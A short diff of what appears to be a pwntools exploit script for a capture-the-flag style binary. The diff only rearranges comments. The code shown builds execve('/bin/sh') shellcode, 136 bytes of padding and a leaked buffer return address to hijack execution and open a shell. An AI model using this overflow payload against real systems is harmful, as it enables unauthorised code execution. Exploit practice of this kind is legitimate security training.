@@ -92,14 +92,11 @@ else:
 p.recvuntil(b"Buffer address: ")
 buffer_addr = int(p.recvline().strip(), 16)
 log.info(f"Buffer address: {hex(buffer_addr)}")
-# VARIABLE
 
-
-# PAYLOAD
 shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05"
 # Tính padding: 128 (buffer) + 8 (saved rbp) = 136
 padding = b'A' * (128 + 8 - len(shellcode))
-# Tạo payload: shellcode + padding + địa chỉ buffer
+# PAYLOAD
 payload = shellcode + padding + p64(buffer_addr)
 
 p.sendline(payload)
